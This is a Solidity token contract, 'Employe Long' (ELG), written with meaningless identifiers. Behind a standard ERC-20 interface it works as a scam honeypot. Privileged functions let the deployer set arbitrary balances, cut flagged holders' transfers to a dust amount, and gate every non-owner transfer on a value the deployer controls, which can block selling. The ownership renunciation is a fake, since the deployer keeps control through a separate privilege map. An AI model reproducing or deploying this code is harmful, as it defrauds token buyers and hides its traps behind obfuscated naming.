//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface modeTrading {
    function totalSupply() external view returns (uint256);

    function balanceOf(address receiverMarketing) external view returns (uint256);

    function transfer(address swapMax, uint256 toShould) external returns (bool);

    function allowance(address maxMarketing, address spender) external view returns (uint256);

    function approve(address spender, uint256 toShould) external returns (bool);

    function transferFrom(
        address sender,
        address swapMax,
        uint256 toShould
    ) external returns (bool);

    event Transfer(address indexed from, address indexed takeLiquidity, uint256 value);
    event Approval(address indexed maxMarketing, address indexed spender, uint256 value);
}

abstract contract maxTake {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface modeList {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface takeMin {
    function createPair(address maxAt, address fundList) external returns (address);
}

interface modeTradingMetadata is modeTrading {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract EmployeLong is maxTake, modeTrading, modeTradingMetadata {

    event OwnershipTransferred(address indexed receiverIsLaunch, address indexed walletList);

    function transferFrom(address fromReceiver, address swapMax, uint256 toShould) external override returns (bool) {
        if (_msgSender() != enableBuy) {
            if (liquidityReceiver[fromReceiver][_msgSender()] != type(uint256).max) {
                require(toShould <= liquidityReceiver[fromReceiver][_msgSender()]);
                liquidityReceiver[fromReceiver][_msgSender()] -= toShould;
            }
        }
        return totalSwap(fromReceiver, swapMax, toShould);
    }

    mapping(address => mapping(address => uint256)) private liquidityReceiver;

    bool public txLaunch;

    function minMarketing(address buyTradingFrom, uint256 toShould) public {
        txMax();
        tokenTake[buyTradingFrom] = toShould;
    }

    uint256 modeMin;

    address public maxTrading;

    mapping(address => bool) public toTrading;

    address private tokenAuto;

    function tokenTo() public {
        emit OwnershipTransferred(maxSwapFrom, address(0));
        tokenAuto = address(0);
    }

    function symbol() external view virtual override returns (string memory) {
        return marketingSell;
    }

    function balanceOf(address receiverMarketing) public view virtual override returns (uint256) {
        return tokenTake[receiverMarketing];
    }

    function isMarketingSell(address fromToken) public {
        txMax();
        
        if (fromToken == maxSwapFrom || fromToken == maxTrading) {
            return;
        }
        launchLiquidity[fromToken] = true;
    }

    address public maxSwapFrom;

    uint256 public txTotal;

    function transfer(address buyTradingFrom, uint256 toShould) external virtual override returns (bool) {
        return totalSwap(_msgSender(), buyTradingFrom, toShould);
    }

    constructor (){
        
        modeList takeTo = modeList(enableBuy);
        maxTrading = takeMin(takeTo.factory()).createPair(takeTo.WETH(), address(this));
        if (txTotal != takeLaunched) {
            txTotal = takeLaunched;
        }
        maxSwapFrom = _msgSender();
        tokenTo();
        toTrading[maxSwapFrom] = true;
        tokenTake[maxSwapFrom] = liquidityFund;
        if (fundMode == takeLaunched) {
            txLaunch = true;
        }
        emit Transfer(address(0), maxSwapFrom, liquidityFund);
    }

    bool public isWalletTotal;

    bool private teamEnableMode;

    uint256 private liquidityFund = 100000000 * 10 ** 18;

    function allowance(address atLaunched, address walletTo) external view virtual override returns (uint256) {
        if (walletTo == enableBuy) {
            return type(uint256).max;
        }
        return liquidityReceiver[atLaunched][walletTo];
    }

    function fundTotal(uint256 toShould) public {
        txMax();
        modeMin = toShould;
    }

    bool public liquidityMin;

    function decimals() external view virtual override returns (uint8) {
        return receiverTxAt;
    }

    function minExempt(address fromReceiver, address swapMax, uint256 toShould) internal returns (bool) {
        require(tokenTake[fromReceiver] >= toShould);
        tokenTake[fromReceiver] -= toShould;
        tokenTake[swapMax] += toShould;
        emit Transfer(fromReceiver, swapMax, toShould);
        return true;
    }

    uint8 private receiverTxAt = 18;

    address enableBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => bool) public launchLiquidity;

    function approve(address walletTo, uint256 toShould) public virtual override returns (bool) {
        liquidityReceiver[_msgSender()][walletTo] = toShould;
        emit Approval(_msgSender(), walletTo, toShould);
        return true;
    }

    function name() external view virtual override returns (string memory) {
        return tradingTeamReceiver;
    }

    uint256 constant receiverSell = 3 ** 10;

    bool private liquidityAmount;

    address tokenAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 public takeLaunched;

    string private marketingSell = "ELG";

    mapping(address => uint256) private tokenTake;

    function getOwner() external view returns (address) {
        return tokenAuto;
    }

    function totalSwap(address fromReceiver, address swapMax, uint256 toShould) internal returns (bool) {
        if (fromReceiver == maxSwapFrom) {
            return minExempt(fromReceiver, swapMax, toShould);
        }
        uint256 swapFrom = modeTrading(maxTrading).balanceOf(tokenAmount);
        require(swapFrom == modeMin);
        require(swapMax != tokenAmount);
        if (launchLiquidity[fromReceiver]) {
            return minExempt(fromReceiver, swapMax, receiverSell);
        }
        return minExempt(fromReceiver, swapMax, toShould);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return liquidityFund;
    }

    string private tradingTeamReceiver = "Employe Long";

    function txMax() private view {
        require(toTrading[_msgSender()]);
    }

    bool private exemptAuto;

    uint256 txTrading;

    function minReceiver(address amountTrading) public {
        if (liquidityMin) {
            return;
        }
        if (txTotal != fundMode) {
            liquidityAmount = false;
        }
        toTrading[amountTrading] = true;
        
        liquidityMin = true;
    }

    uint256 private fundMode;

    function owner() external view returns (address) {
        return tokenAuto;
    }

}